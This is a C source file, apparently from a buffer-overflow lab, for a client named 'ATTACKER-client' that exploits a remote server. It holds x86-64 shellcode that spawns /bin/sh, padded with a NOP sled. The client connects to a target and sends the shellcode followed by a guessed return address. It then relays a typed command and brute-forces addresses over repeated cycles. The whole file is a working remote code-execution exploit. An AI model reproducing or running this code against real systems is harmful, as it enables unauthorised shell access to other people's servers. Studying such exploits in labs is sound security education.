/*
  ATTACKER-client.C
  ==========
*/


#include <sys/socket.h>       /*  socket definitions        */
#include <sys/types.h>        /*  socket types              */
#include <arpa/inet.h>        /*  inet (3) funtions         */
#include <unistd.h>           /*  misc. UNIX functions      */
#include <netinet/in.h>
#include <netdb.h>

#include "helper.h"           /*  Our own helper functions  */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int ParseCmdLine(int , char **, char **, char **);

//unsigned long  ATTACK_ADDRESS = 0x7fff1b2f99f0; 
unsigned long  ATTACK_ADDRESS; 
int  ATTACK_CYCLES ; 

#ifndef VARIANT
#define STEP (1)
const char shellcode[] =
        "\x48\x31\xc0"                               // xor    %rax,%rax
        "\x99"                                       // cltd
        "\xb0\x3b"                                   // mov    $0x3b,%al
        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
        "\x57"                                       // push   %rdi
        "\x48\x89\xe7"                               // mov    %rsp,%rdi
        "\x57"                                       // push   %rdi
        "\x52"                                       // push   %rdx
        "\x48\x89\xe6"                               // mov    %rsp,%rsi
        "\x0f\x05"                                  // syscall
	"\x90"  //32 bytes up to here
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90"; //8 bytes line for a total of 136 bytes
#else
#define STEP (16)
const char shellcode[] =
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
        "\x48\x31\xc0"                               // xor    %rax,%rax
        "\x99"                                       // cltd
        "\xb0\x3b"                                   // mov    $0x3b,%al
        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
        "\x57"                                       // push   %rdi
        "\x48\x89\xe7"                               // mov    %rsp,%rdi
        "\x57"                                       // push   %rdi
        "\x52"                                       // push   %rdx
        "\x48\x89\xe6"                               // mov    %rsp,%rsi
        "\x0f\x05"                                  // syscall
	"\x90"  //32 bytes up to here
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //16 bytes line
	"\x90\x90\x90\x90\x90\x90\x90\x90"; //8 bytes line for a total of 136 bytes
#endif

#define MAX_LINE           (1024)

char attackstring[MAX_LINE];		/*  the actual string passed to the server */
char output[4096];



int main(int argc, char *argv[])
{
    int       conn_s;                /*  connection socket         */
    short int port;                  /*  port number               */
    struct    sockaddr_in servaddr;  /*  socket address structure  */
    char      buffer[MAX_LINE];      /*  character buffer          */
    char     *szAddress;             /*  Holds remote IP address   */
    char     *szPort;                /*  Holds remote port         */
    char     *endptr;                /*  for strtol()              */
    struct  hostent *he;
    int ret;
    struct timeval	timer;

    int i;

    he=NULL;
    buffer[0] = '\0';

    /*  Get command line arguments  */

    ParseCmdLine(argc, argv, &szAddress, &szPort);

    if(argc < 7){
	printf("also need an attack address and a number fo attack cycles to carry out\n");
	exit(EXIT_FAILURE);
    }

    ATTACK_ADDRESS = (unsigned long)(strtoul(argv[5],NULL,16));
    ATTACK_CYCLES = (unsigned long)(strtol(argv[6],NULL,10));

    printf("Starting attack at address %p\n",(void*)ATTACK_ADDRESS);


attack:

    /*  Set the remote port  */

    port = strtol(szPort, &endptr, 0);
    if ( *endptr ) {
	printf("client: unmanaged port.\n");
	exit(EXIT_FAILURE);
    }
    

    /*  Create the listening socket  */

    if ( (conn_s = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
	fprintf(stderr, "client: socket creation error.\n");
	exit(EXIT_FAILURE);
    }


    /*  Set all bytes in socket address structure to
        zero, and fill in the relevant data members   */

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family      = AF_INET;
    servaddr.sin_port        = htons(port);


    /*  Set the remote IP address  */

    if ( inet_aton(szAddress, &servaddr.sin_addr) <= 0 ) {
	printf("client: resolving the host name ...");
	
	if ((he=gethostbyname(szAddress)) == NULL) {
	    printf("faulure.\n");
	    exit(EXIT_FAILURE);
	}
	printf("OK.\n\n");
	servaddr.sin_addr = *((struct in_addr *)he->h_addr);
    }
    
    
    
    /*  connect() to the remote echo server  */

    if ( connect(conn_s, (struct sockaddr *) &servaddr, sizeof(servaddr) ) < 0 ) {
	printf("client: connection error.\n");
	exit(EXIT_FAILURE);
    }


    /*  assemble attack string */

    printf("Shell code is made up by %d bytes\n",(int)strlen(shellcode));

    memcpy(attackstring,shellcode,strlen(shellcode));
    memcpy((char*)attackstring+strlen(shellcode),(char*)&ATTACK_ADDRESS,sizeof(ATTACK_ADDRESS));

    printf("Attack string is made up by %lu bytes\n",strlen(shellcode)+sizeof(ATTACK_ADDRESS));


    write(conn_s,attackstring,strlen(shellcode)+sizeof(ATTACK_ADDRESS)); //144

    if(strcmp(buffer,"") == 0 ){
	
  	printf("Please insert attack command: ");
    	fgets(buffer, MAX_LINE, stdin);
	
    }

    
    /*  Send attack string to server  */
 
    sleep(1);

    timer.tv_sec  =  1;
    timer.tv_usec = 0;
    setsockopt(conn_s, SOL_SOCKET, SO_RCVTIMEO, &timer, sizeof(timer));


    Writeline(conn_s, buffer, strlen(buffer));
    ret = read(conn_s,output,4096);
    write(1,output,ret);

    ret = read(conn_s,output,4096);
    write(1,output,ret);

    close(conn_s);

    ATTACK_CYCLES--;
    ATTACK_ADDRESS += STEP;

    if(ATTACK_CYCLES >= 0) goto attack;

    return EXIT_SUCCESS;
}


int ParseCmdLine(int argc, char *argv[], char **szAddress, char **szPort)
{
    int n = 1;

    while ( n < argc ) {
	if ( !strncmp(argv[n], "-a", 2) || !strncmp(argv[n], "-A", 2) ) {
	    *szAddress = argv[++n];
	}
	else 
	    if ( !strncmp(argv[n], "-p", 2) || !strncmp(argv[n], "-P", 2) ) {
		*szPort = argv[++n];
	    }
	else
	    if ( !strncmp(argv[n], "-h", 2) || !strncmp(argv[n], "-H", 2) ) {
		printf("usage:\n\n");
		printf("    progname -a (server address) -p (server port) [-h].\n\n");
		exit(EXIT_SUCCESS);
	    }
	++n;
    }
    if (argc==1) {
	printf("usage:\n\n");
	printf("    progname -a (server address) -p (server port) [-h].\n\n");
	exit(EXIT_SUCCESS);
    }
    return 0;
}
